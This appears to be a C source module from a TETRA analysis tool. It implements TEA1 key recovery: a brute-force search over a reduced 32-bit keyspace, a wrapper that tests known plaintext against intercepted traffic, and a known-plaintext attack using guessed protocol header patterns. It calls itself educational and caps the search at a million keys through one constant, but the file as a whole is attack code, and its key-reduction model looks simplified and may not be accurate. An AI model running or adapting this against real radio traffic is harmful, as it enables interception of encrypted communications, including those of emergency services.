/*
 * TEA1 Key Recovery Module
 * Demonstrates the TEA1 vulnerability allowing key recovery
 *
 * Educational implementation of the vulnerability documented in:
 * "TETRA:BURST - Decrypting TETRA" - Midnight Blue (2023)
 *
 * The vulnerability reduces the effective keyspace from 2^80 to 2^32,
 * making brute-force attacks feasible on modern hardware.
 */

#include "tetra_analyzer.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Test if a candidate key successfully decrypts the ciphertext
static bool test_key_candidate(uint32_t candidate_key, const uint8_t *ciphertext,
                               const uint8_t *known_plaintext, size_t len) {
    tea1_context_t test_ctx;
    uint8_t test_key[TEA1_KEY_SIZE] = {0};

    // Convert 32-bit candidate to 80-bit key format
    test_key[0] = (candidate_key >> 24) & 0xFF;
    test_key[1] = (candidate_key >> 16) & 0xFF;
    test_key[2] = (candidate_key >> 8) & 0xFF;
    test_key[3] = candidate_key & 0xFF;
    // Remaining bytes stay 0 (they don't matter due to vulnerability)

    tea1_init(&test_ctx, test_key, true);

    // Decrypt first block
    uint8_t decrypted[TEA1_BLOCK_SIZE];
    tea1_decrypt_block(&test_ctx, ciphertext, decrypted);

    // Compare with known plaintext
    size_t compare_len = (len < TEA1_BLOCK_SIZE) ? len : TEA1_BLOCK_SIZE;
    return (memcmp(decrypted, known_plaintext, compare_len) == 0);
}

void tea1_brute_force_32bit(const uint8_t *ciphertext, const uint8_t *known_plaintext,
                            size_t len, tea1_context_t *result) {
    log_message(true, "\n=== TEA1 32-bit Keyspace Brute Force ===\n");
    log_message(true, "Exploiting known vulnerability to reduce keyspace\n");
    log_message(true, "This would take ~2^32 operations (~4 billion keys)\n");
    log_message(true, "On modern hardware: minutes to hours instead of centuries\n\n");

    uint64_t start_time = get_timestamp_us();
    uint64_t keys_tested = 0;
    uint32_t found_key = 0;
    bool success = false;

    // For educational demonstration, we'll test a limited subset
    // Real attack would test all 2^32 possibilities
    uint32_t test_limit = 1000000; // Test 1 million keys for demonstration

    log_message(true, "Testing %u candidate keys (educational subset)...\n", test_limit);

    for (uint32_t candidate = 0; candidate < test_limit; candidate++) {
        keys_tested++;

        if (test_key_candidate(candidate, ciphertext, known_plaintext, len)) {
            found_key = candidate;
            success = true;
            log_message(true, "\n✓ KEY FOUND! 0x%08X after %lu attempts\n",
                       found_key, (unsigned long)keys_tested);
            break;
        }

        // Progress indicator
        if (candidate % 100000 == 0 && candidate > 0) {
            uint64_t elapsed = get_timestamp_us() - start_time;
            double rate = (double)keys_tested / (elapsed / 1e6);
            log_message(true, "Progress: %u keys tested (%.0f keys/sec)\n",
                       candidate, rate);
        }
    }

    uint64_t total_time = get_timestamp_us() - start_time;

    if (success) {
        // Initialize result context with found key
        uint8_t recovered_key[TEA1_KEY_SIZE] = {0};
        recovered_key[0] = (found_key >> 24) & 0xFF;
        recovered_key[1] = (found_key >> 16) & 0xFF;
        recovered_key[2] = (found_key >> 8) & 0xFF;
        recovered_key[3] = found_key & 0xFF;

        tea1_init(result, recovered_key, true);

        log_message(true, "\nKey recovery successful!\n");
        log_message(true, "Time: %.2f seconds\n", total_time / 1e6);
        log_message(true, "Reduced key: 0x%08X\n", found_key);
        hex_dump(recovered_key, TEA1_KEY_SIZE, "Recovered 80-bit key");
    } else {
        log_message(true, "\nKey not found in tested subset.\n");
        log_message(true, "Note: Full 2^32 keyspace attack would continue...\n");
        log_message(true, "Time elapsed: %.2f seconds\n", total_time / 1e6);
        log_message(true, "Average rate: %.0f keys/sec\n",
                   (double)keys_tested / (total_time / 1e6));

        // Estimate time for full keyspace
        double full_time = (4294967296.0 / keys_tested) * (total_time / 1e6);
        log_message(true, "Estimated time for full 2^32 search: %.1f hours\n",
                   full_time / 3600.0);
    }
}

bool tea1_crack_key(const uint8_t *ciphertext, const uint8_t *known_plaintext,
                    size_t len, tea1_context_t *ctx) {
    if (!ciphertext || !known_plaintext || !ctx || len < TEA1_BLOCK_SIZE) {
        return false;
    }

    log_message(true, "\n=== Starting TEA1 Key Recovery ===\n");
    hex_dump(ciphertext, TEA1_BLOCK_SIZE, "Ciphertext");
    hex_dump(known_plaintext, len, "Known plaintext");

    // Perform brute force attack on reduced keyspace
    tea1_brute_force_32bit(ciphertext, known_plaintext, len, ctx);

    return ctx->reduced_key != 0;
}

// Additional vulnerability: Known plaintext attack using TETRA protocol structure
bool tea1_known_plaintext_attack(const uint8_t *intercepted_traffic,
                                  size_t traffic_len, tea1_context_t *result) {
    log_message(true, "\n=== TEA1 Known Plaintext Attack ===\n");
    log_message(true, "Exploiting predictable TETRA protocol headers\n\n");

    // TETRA frames have known structure:
    // - Training sequences (known patterns)
    // - Synchronization bursts (predictable content)
    // - Color codes and system information

    // Common TETRA header patterns (simplified)
    const uint8_t known_patterns[][8] = {
        {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Null encryption
        {0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55}, // Test pattern
        // Additional known patterns from TETRA specification
    };

    for (size_t i = 0; i < sizeof(known_patterns) / sizeof(known_patterns[0]); i++) {
        log_message(true, "Trying known pattern %zu...\n", i);

        if (traffic_len >= TEA1_BLOCK_SIZE) {
            if (tea1_crack_key(intercepted_traffic, known_patterns[i],
                              TEA1_BLOCK_SIZE, result)) {
                log_message(true, "✓ Key recovered using pattern %zu!\n", i);
                return true;
            }
        }
    }

    log_message(true, "Known plaintext attack unsuccessful with current patterns\n");
    return false;
}
